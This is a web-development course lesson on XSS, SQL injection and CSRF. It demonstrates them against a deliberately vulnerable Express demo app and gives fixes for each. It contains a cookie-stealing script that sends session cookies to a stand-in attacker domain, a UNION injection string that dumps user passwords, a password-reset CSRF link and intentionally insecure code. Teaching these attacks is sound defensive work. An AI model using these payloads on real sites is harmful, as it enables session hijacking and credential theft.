# 4.4: Security

## Learning Objectives

1. The most vulnerable security loopholes are usually human ones such as phishing or insecure storage of passwords
2. If we follow best practices for building apps, generally our apps should be technically secure
3. Know how well-known attacks such as XSS, CSRF and SQL injection work

## Introduction

Data breaches more commonly exploit human behaviour than technical loopholes, using techniques such as phishing to retrieved credentials from privileged users. This is why cybersecurity is more often about mandating phishing training, multi-factor authentication and minimal access privileges across organisations than technical security of applications.

If we follow best practices for building apps as we have so far, our apps should be technically secure. When we deviate from standard libraries and configure authentication, database access, cloud access privileges manually, that is when security considerations become more relevant. Teams that manage sensitive data should conduct regular audits to ensure technical application security.

In this submodule we will learn about 3 well-known types of technical attacks on web applications, so common they are listed in the [OWASP Top 10](https://owasp.org/www-project-top-ten/), a publicly-maintained list of the 10 most common web application security risks. These are Cross-Site Scripting (XSS), SQL Injection and Cross-Site Request Forgery.

## Sample App

For all the examples we'll be using this deployed express app: [https://express-security-bootcamp.herokuapp.com/](https://express-security-bootcamp.herokuapp.com/)

The code for this app is here: [https://github.com/rocketacademy/express-security-bootcamp](https://github.com/rocketacademy/express-security-bootcamp)

## Cross-Site Scripting (XSS)

XSS stands for Cross-Site Scripting. This is a vulnerability where a malicious attacker is allowed to save a snippet of JavaScript in the system that will be displayed later.

When that snippet is run on other site visitors browsers, the attacker can run a number of different kinds of insecure programs.

Here is how we would implement an XSS attack:

#### XSS Part 1 - Saving unsanitized user input

The first part of an XSS attack is the ability of an attacker to save JavaScript into the database.

```javascript
<script>alert('hey!')</script>
```

If we paste this HTML snippet directly into the form input it will be saved to the database.

![](../.gitbook/assets/xss-form.png)

#### XSS Part 2 - Displaying unsanitized user input

Once this "cat" record has been saved to the database, any user who navigates to a page displaying this "cat" will run the JavaScript snippet above.

![](../.gitbook/assets/xss-alert.png)

#### XSS Part 3 - Capturing and sending user session cookies

Now that we have the ability to run arbitrary JavaScript for every user who visits the site, we can do malicious things. One of the worst might be to steal the session cookie of any logged in user.

In order to do that we need to save a particular kind of JavaScript, one that gets a hold of the user's cookie and sends it to a server we control.

Commented Version:

```javascript
<script>
  var allCookies = document.cookie; // don't do an AJAX request in case there
  are CORS issues // create an image tag var imgEl =
  document.createElement('img'); // settting the img src causes the browser to
  try and request from this domain imgEl.src =
  'http://my-bad-domain.com?'+allCookies;
</script>
```

Compact Version:

```javascript
<script>
  var allCookies = document.cookie;var imgEl =
  document.createElement('img');imgEl.src =
  'http://my-bad-domain.com?'+allCookies;
</script>
```

Open the network tab and notice how all the cookie information is being sent to the malicious server.

![](../.gitbook/assets/xss-cookie.png)

### XSS Solutions

In the example app this XSS attack was facilitated by 2 parts of the code:

**1. No validation of the user's inputs.**

Ideally the app would never allow a user to enter any text into the cat name field that resembles code.

An easy implementation to guard against this is to use one of many common NPM libraries made for this purpose. [xss](https://www.npmjs.com/package/xss) is one of the most popular.

Note that string sanitization so that it is guaranteed not to contain JavaScript is a very hard problem to solve. See this example here: [https://dev.to/catmcgeecode/code-anything-in-javascript-with-only-8-characters-5ghp](https://dev.to/catmcgeecode/code-anything-in-javascript-with-only-8-characters-5ghp)

**2. No sanitization of the display of the database values.**

In this special express app we are not running EJS. When we print out the values from the database our code will directly generate HTML tags that will be interpreted by the browser.

See the code here: [https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L320](https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L320)

If we had used EJS, the code's characters would be displayed on the screen, instead of being interpreted by the browser. This is called HTML character escape. Most modern view / HTML generation libraries will provide this functionality built-in. However, character escape does not always keep the app safe from XSS. The other measures already mentioned should still be implemented.

## SQL Injection

SQL injection means the ability of an attacker to run some arbitrary SQL code against the app database using some SQL language syntax techniques.

The following link makes a GET request to the API part of the app: [https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L315-L327](https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L315-L327)

The end of this link has some SQL statements appended to the end of it.

```sql
' UNION SELECT email, password FROM users--
```

After the complete query is constructed it looks like this: (take a look at the console.log that prints this query out).

```sql
SELECT name,type from cats WHERE name='kai' UNION SELECT email, password FROM users--'
```

According to the source UNION "_lets you execute an additional `SELECT` query and append the results to the original query_".

You can learn more about this example query here: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

Here is the link to the app: \[[https://express-security-bootcamp.herokuapp.com/api/cats/kai' UNION SELECT email, password FROM users--\](https://express-security-bootcamp.herokuapp.com/api/cats/kai' UNION SELECT email, password FROM users--](https://express-security-bootcamp.herokuapp.com/api/cats/kai'%20UNION%20SELECT%20email,%20password%20FROM%20users--]\(https:/express-security-bootcamp.herokuapp.com/api/cats/kai'%20UNION%20SELECT%20email,%20password%20FROM%20users--))

Notice that it prints out a list of all users and their passwords.

### SQL Injection Solutions

The main part of the app that exposes this vulnerability is this line: [https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L317](https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L317)

Raw concatenation of request parameters into a SQL query should be avoided. (This applies anywhere in the query, not just if there is a WHERE clause).

```javascript
const query =
  "SELECT name, type from cats WHERE name='" + request.params.name + "'";
```

Parameterized SQL queries will not have the same problems. The following syntax is preferred in all cases.

```javascript
const query = "SELECT name, type from cats WHERE name=$1";
values = [request.params.name];
```

### Further Reading

[OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL\_Injection)

[SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

## Cross-Site Request Forgery (CSRF)

A request can be sent as the viewing user and /or a request can be forged by an attacker.

CSRF stands for Cross-Site Request Forgery. This is when a request that is supposed to originate from something like a form submit is actually generated from somewhere else on the internet.

**1. CSRF Part 1: Be able to create a request**

A link or other mechanism must be put in place such that the victim's browser creates an unwanted request. This link could also be hidden in the `src` of an image tag, or simply posted as a link for others to click on.

For example, the sample app is made so that we do not check for CSRF.

The following link will reset the password of a logged in user who clicks on it: [https://express-security-bootcamp.herokuapp.com/?email=someemail@attacker.com\&password=1234](https://express-security-bootcamp.herokuapp.com/?email=someemail@attacker.com\&password=1234)

**2. CSRF Part 2: Accept a request that is not authentic**

The relevant code is here:[https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L187-L200](https://github.com/rocketacademy/express-security-bootcamp/blob/main/index.js#L187-L200)

The route uses GET instead of POST or PUT. Even though it verifies the user, if the user had clicked on the above link, they would have been logged in, and their password would have been changed.

The original intention of this Express.js route is that the GET request originates from a form within the app, but in this case it comes from a malicious link that was created above by the attacker.

```javascript
app.get('/user/edit', checkAuth, (request, response) => {
  const values = [
    request.query.email,
    getHash(request.query.password),
    request.cookies.userId,
  ];

  pool
    .query('UPDATE users SET email=$1 password=$2 WHERE id=$3', values)
    .then((result) => {
      response.send('done');
    })
    .catch((error) => {
      console.log('Error executing query', error.stack);
      response.status(503).send('sorry');
    });
});
```

### CSRF Solutions

For every request we can add on another layer of verification so that the system knows that the request was either generated from a form originating on the site or from JavaScript originating from the site.

The Express.js documentation details installing the [csurf middleware.](http://expressjs.com/en/resources/middleware/csurf.html)
